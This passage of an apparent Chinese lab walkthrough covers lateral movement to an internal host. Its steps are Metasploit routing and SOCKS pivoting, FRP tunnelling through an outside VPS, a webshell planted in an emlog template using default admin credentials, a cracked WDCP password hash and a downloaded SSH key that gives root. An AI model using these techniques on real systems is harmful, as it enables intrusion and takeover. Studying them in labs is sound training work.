+<p>查看本机 hosts 文件，发现域名<code>www.ddd5.com</code>对应解析IP为<code>10.10.10.144</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.10.37.png" alt="截屏2022-07-12 03.10.37"></p>
+<p>尝试 ping 目标主机，说明目标主机存活</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 10.10.10.144</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.10.51.png" alt="截屏2022-07-12 03.10.51"></p>
+<p>与此同时，可将shell转移至 MSF 当中以方便建立代理，利用之前上传的木马以 root 权限再次执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /www/wwwroot/www.ddd4.com/</span><br><span class="line">./macmsf</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.17.50.png" alt="截屏2022-07-12 03.17.50"></p>
+<p>成功在 MSF 中收到反弹shell且权限为 root<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.18.22.png" alt="截屏2022-07-12 03.18.22"></p>
+<h3 id="建立socks代理"><a href="#建立socks代理" class="headerlink" title="建立socks代理"></a>建立socks代理</h3><p>利用模块<code>get_local_subnets</code>查看当前网段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.20.26.png" alt="截屏2022-07-12 03.20.26"><br>添加内网路由段<code>10.10.10.0/24</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.21.53.png" alt="截屏2022-07-12 03.21.53"><br>查看当前已添加路由</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.22.02.png" alt="截屏2022-07-12 03.22.02"><br>运行模块<code>socks_proxy</code>建立 socks 代理</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use auxiliary/server/socks_proxy</span><br><span class="line">meterpreter &gt; set srvport 2222</span><br><span class="line">meterpreter &gt; show options</span><br><span class="line">meterpreter &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.23.56.png" alt="截屏2022-07-12 03.23.56"><br>通过 proxychains 建立代理</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/local/etc/proxychains.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">配置</span></span><br><span class="line">socks5 127.0.0.1 2222</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.25.49.png" alt="截屏2022-07-12 03.25.49"></p>
+<p>使用 nmap 通过代理进行扫描，测试成功</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -Pn 10.10.10.144</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.27.00.png" alt="截屏2022-07-12 03.27.00"></p>
+<p>端口扫描结果如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2004.17.23.png" alt="截屏2022-07-12 04.17.23"></p>
+<p>同样地，我们也对 hosts 文件完成域名解析</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 配置</span></span></span><br><span class="line">10.10.10.144 www.ddd5.com</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.33.13.png" alt="截屏2022-07-12 03.33.13"></p>
+<p>利用代理访问<code>www.ddd5.com</code>域名，但是加载速度缓慢，尝试使用 FRP 建立代理，其中<code>frpc.ini</code>代理配置如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 6000</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+<p><code>frps.ini</code>配置如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>
+<p>上传 Linux 版本的<code>frps</code>和<code>frps.ini</code>至 VPS 服务器并执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
+<p>在靶机中上传<code>frpc</code>和<code>frpc.ini</code>，同时连接 FRP<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2004.53.47.png" alt="截屏2022-07-12 04.53.47"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
+<p>通过 proxychains 建立代理</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/local/etc/proxychains.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">配置</span></span><br><span class="line">socks5 x.x.x.x 6000</span><br></pre></td></tr></table></figure>
+
+<p>设置浏览器代理后访问域名<code>www.ddd5.com</code>，访问后发现站点CMS为emlog<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2005.00.52.png" alt="截屏2022-07-12 05.00.52"></p>
+<h3 id="内网主机权限获取"><a href="#内网主机权限获取" class="headerlink" title="内网主机权限获取"></a>内网主机权限获取</h3><p>emlog是基于php的博客程序，默认后台地址为<code>/admin</code>，默认账号密码为<code>admin/123456</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2005.03.50.png" alt="截屏2022-07-12 05.03.50"></p>
+<p>成功登录网站后台<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2005.04.06.png" alt="截屏2022-07-12 05.04.06"></p>
+<p>在<code>外观》模板</code>中存在模板管理，利用模版上传可实现木马部署<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2000.46.21.png" alt="截屏2022-07-13 00.46.21"></p>
+<p>在一个正常的emlog模版中添加木马，重新将模板打包为<code>mac.zip</code>并上传安装</p>
+<p><strong>模板地址：<a target="_blank" rel="noopener" href="https://github.com/jjonline/J2">https://github.com/jjonline/J2</a></strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2000.49.57.png" alt="截屏2022-07-13 00.49.57"></p>
+<p>成功上传模板，说明木马已经部署完成，模版的默认路径为<code>/content/templates/</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2001.00.52.png" alt="截屏2022-07-13 01.00.52"></p>
+<p>使用菜刀设置代理，成功连接木马<code>/content/templates/mac/1.php</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2001.11.59.png" alt="截屏2022-07-13 01.11.59"></p>
+<h3 id="内网主机权限提升"><a href="#内网主机权限提升" class="headerlink" title="内网主机权限提升"></a>内网主机权限提升</h3><p>查询当前用户权限以及开放端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">netstat -ntlp</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.12.05.png" alt="截屏2022-07-13 02.12.05"></p>
+<p>访问目标80端口发现多个信息点</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">存在应用PHP、Apache、MySQL、phpMyAdmin</span><br><span class="line">8080端口为系统管理面板，存在默认账号密码 admin/wdlinux.cn</span><br><span class="line">存在PHP探针、phpinfo界面</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.13.43.png" alt="截屏2022-07-13 02.13.43"><br>访问探针和phpinfo界面，获取服务器相关信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.19.49.png" alt="截屏2022-07-13 02.19.49"></p>
+<p>访问目标8080端口，使用默认账号密码进行登录WDCP，但是登录失败<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.14.34.png" alt="截屏2022-07-13 02.14.34"></p>
+<p>通过目录扫描发现<code>phpmyadmin</code>，使用<code>root/wdlinux.cn</code>成功登录phpmyadmin<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.32.27.png" alt="截屏2022-07-13 02.32.27"></p>
+<p>在phpmyadmin中成功找到WDCP对应的密码哈希<code>17d03da6474ce8beb13b01e79f789e63</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.37.34.png" alt="截屏2022-07-13 02.37.34"></p>
+<p>通过在线破解网站 somd5 进行查询，成功拿到密码为<code>moonsec123</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.39.29.png" alt="截屏2022-07-13 02.39.29"></p>
+<p>利用<code>admin/moonsec123</code>登录WDCP系统管理界面，结果显示登录超时<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.41.28.png" alt="截屏2022-07-13 02.41.28"></p>
+<p>使用木马查询服务器当前时间并对比当前系统时间<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.44.27.png" alt="截屏2022-07-13 02.44.27"></p>
+<p>我们需要将系统时间修改为服务器系统时间<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.53.14.png" alt="截屏2022-07-13 02.53.14"></p>
+<p>再次登录，成功登录WDCP主机管理系统<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2020-05-17%2011.05.37.png" alt="截屏2020-05-17 11.05.37"></p>
+<p>在命令执行模块中虽然能够执行命令且权限为root，但是无法运行反弹shell等危险命令<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2020-05-17%2011.05.21.png" alt="截屏2020-05-17 11.05.21"></p>
+<p>幸运的是，在ssh管理模块中可生成密钥并下载<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2020-05-17%2011.04.33.png" alt="截屏2020-05-17 11.04.33"></p>
+<p>使用命令将密钥权限设置为600</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 sshkey_wdcp</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2020-05-17%2011.14.31.png" alt="截屏2020-05-17 11.14.31"></p>
+<p>指定密钥文件通过代理登录目标SSH，成功拿到root权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ssh -i sshkey_wdcp root@10.10.10.144</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2020-05-17%2011.15.15.png" alt="截屏2020-05-17 11.15.15"></p>
+<p>在管理员目录中成功发现第三个flag：<code>56a7043405ad08a649bd611569e1a243</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/1.png" alt="1"></p>
+<p>当然这里肯定有小伙伴会问为什么不通过 phpmyadmin 完成提权，首先执行SQL语句查看是否存在写入权，<code>secure_file_priv</code>显示为空说明不限制导入导出</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure_file%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2003.14.36.png" alt="截屏2022-07-13 03.14.36"></p>
+<p>通过木马找到 phpmyadmin 的绝对路径为<code>/www/wdlinux/wdcp/phpmyadmin</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2003.15.46.png" alt="截屏2022-07-13 03.15.46"></p>
+<p>执行SQL语句写入木马，但结果显示无法写入</p>
